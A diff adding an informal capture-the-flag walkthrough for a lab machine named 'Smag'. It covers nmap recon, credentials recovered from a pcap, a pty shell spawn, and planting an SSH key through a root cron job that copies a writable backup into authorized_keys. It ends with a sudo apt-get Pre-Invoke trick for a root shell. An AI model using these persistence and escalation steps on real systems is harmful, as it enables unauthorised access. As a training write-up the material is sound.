@@ -1,0 +1,99 @@
+IP -- 10.10.22.249
+
+
+NMAP SCAN -- 
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-08-04 21:38 IST
+Nmap scan report for 10.10.22.249
+Host is up (0.21s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Smag
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+
+NOW go for some dirsearch.
+we got a directory known as /mail
+and there we get a pcap file 
+
+now wget the file and analyze it using wireshark.
+
+
+'''
+POST /login.php HTTP/1.1
+Host: development.smag.thm
+User-Agent: curl/7.47.0
+Accept: */*
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=#######&password=#######HTTP/1.1 200 OK
+Date: Wed, 03 Jun 2020 18:04:07 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+'''
+
+by this we get a hostname known as  ''development.smag.thm'' now adding this is to my hosts file by '''nano /etc/hosts''' 
+
+After adding it  go to 'development.smag.thm/login.php'  you will get a prompt where u have to login using the creds we got in pcap file '''username=#######&password=######''' .
+Now u will get a prompt where u can use some commands.
+ do some basic recon on that page.
+
+i just make a spawn shell and the started performing some basic recon on that  '''python3 -c 'import pty; pty.spawn("/bin/bash")'  '''
+then i used a command to see the cronjobs for the users 
+''' cat /etc/crontabs '''
+then i got some output
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+
+
+at last i got there is jake_id_rsa.pub.backup copied for jake and when i see the permisiion of backup file i got hit that i can use it for copying my id to that file and then ssh to jake 	
+
+first we will create a rsa key for jake on our machine by using command 
+''' sshkeygen -f jake '''
+
+and put the pub key in backup file.
+
+then use the command on the victim macine as ''' echo 'public id created for jake' > /opt/.backups/jake_id_rsa.pub.backup '''
+
+
+and after 2-3 minutes when the cronjob start i can able to ssh in jakes machine using
+''' ssh -i jake jake@ip  '''
+
+
+now i got ssh into the machine now cat out the user text.
+
+FOR PRIV ESEC 
+we do ''' sudo -l '''
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+
+Now after some gtfobins i got a command to gain root shell 
+''' sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh '''
+
+
+and boom i got the root now cat the cat flag.
